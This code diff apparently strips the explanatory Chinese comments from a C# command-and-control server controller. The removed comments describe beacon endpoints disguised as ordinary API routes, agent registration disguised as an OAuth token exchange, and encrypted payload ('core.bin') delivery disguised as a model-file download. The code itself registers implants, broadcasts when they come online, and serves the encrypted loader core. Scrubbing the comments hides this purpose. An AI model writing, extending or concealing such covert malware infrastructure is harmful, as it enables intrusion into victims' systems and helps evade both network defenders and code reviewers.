@@ -12,11 +12,6 @@ using LibraNextgen.Service.Services;
 namespace LibraNextgen.Service.Controllers;
 
 /// <summary>
-/// 无 beacon 字样的 bootstrap 端点（流量伪装）：
-///   POST /api/v1/session        — agent 注册（混合加密：RSA 包临时 AES key + AES-GCM 注册体）
-///   POST /api/v1/auth/token     — loader 协商 core 解密密钥（同混合加密）
-///   GET  /api/v1/models/{id}    — loader 下载加密 core.bin（伪装成模型文件下载）
-/// 旧 /api/beacon/* 端点保留兼容旧 agent。
 /// </summary>
 [ApiController]
 [Route("api/v1")]
@@ -54,9 +49,6 @@ public class V1BootstrapController : ControllerBase
     }
 
     /// <summary>
-    /// agent 注册（bootstrap），伪装为 OAuth client_credentials 令牌交换：
-    ///   {"grant_type":"client_credentials","client_id":"<AES-GCM 注册体>","client_secret":"<RSA-OAEP(AES key)>"}
-    /// 服务端用部署 RSA 私钥解出临时 AES key 再解密注册体。
     /// </summary>
     [HttpPost("session")]
     public async Task<IActionResult> Session([FromBody] JsonElement? body)
@@ -83,7 +75,6 @@ public class V1BootstrapController : ControllerBase
         }
         else if (body is { } plainEl)
         {
-            // 兼容 fallback：无公钥注入的旧构建（明文）
             try
             {
                 request = plainEl.Deserialize<RegisterRequest>(new JsonSerializerOptions
@@ -108,8 +99,6 @@ public class V1BootstrapController : ControllerBase
         if (agent == null)
             return StatusCode(500, new { error = "registration failed" });
 
-        // 上线广播 + AI 事件订阅通知（与 /api/beacon/register 路径一致；
-        // 否则走 v1 加密注册的 agent 永远不会触发"上线"事件）。
         _ = BroadcastOnlineAsync(agent, clientIp);
 
         var sessionKey = _commsService.EstablishSessionKey(agent.Id, request.PublicKey, request.HasSessionKey);
@@ -129,7 +118,6 @@ public class V1BootstrapController : ControllerBase
         return Ok(response);
     }
 
-    /// <summary>上线广播 + AI 事件订阅（Agent 上线 → Justitia 生成提醒并送达订阅目标）。</summary>
     private async Task BroadcastOnlineAsync(Agent agent, string clientIp)
     {
         try
@@ -145,12 +133,10 @@ public class V1BootstrapController : ControllerBase
         }
         catch
         {
-            // 广播失败不阻断注册流程。
         }
         _ = _aiEventNotifier.NotifyAsync(agent.Id, agent.Hostname, clientIp, AiEventNotifier.EvtAgentOnline);
     }
 
-    /// <summary>loader 协商 core 解密密钥：同样 OAuth 风格（client_id=密文体, client_secret=RSA(AES key)）。</summary>
     [HttpPost("auth/token")]
     public IActionResult AuthToken([FromBody] JsonElement? body)
     {
@@ -190,7 +176,6 @@ public class V1BootstrapController : ControllerBase
         {
             var aesKey = System.IO.File.ReadAllBytes(keyPath);
             var encrypted = CryptoHelper.RsaEncrypt(aesKey, request.PublicKey);
-            // 发放一次性下载凭证（core.bin 防枚举）：5 分钟有效、绑定 buildId
             var ticket = _tickets.Issue(request.BuildId);
             return Ok(new
             {
@@ -204,14 +189,12 @@ public class V1BootstrapController : ControllerBase
         }
     }
 
-    /// <summary>下载加密 core.bin（伪装成模型文件下载）。需一次性下载凭证 t=…。</summary>
     [HttpGet("models/{buildId}")]
     public IActionResult Models(string buildId, [FromQuery] string? t)
     {
         if (string.IsNullOrWhiteSpace(buildId) || buildId.Any(c => !char.IsAsciiLetterOrDigit(c)))
             return BadRequest(new { error = "invalid build id" });
 
-        // 防枚举：无有效凭证一律拒绝（凭证一次性、5 分钟有效、绑定 buildId）
         if (!_tickets.Consume(buildId, t ?? ""))
             return Unauthorized(new { error = "invalid or expired download token" });
 
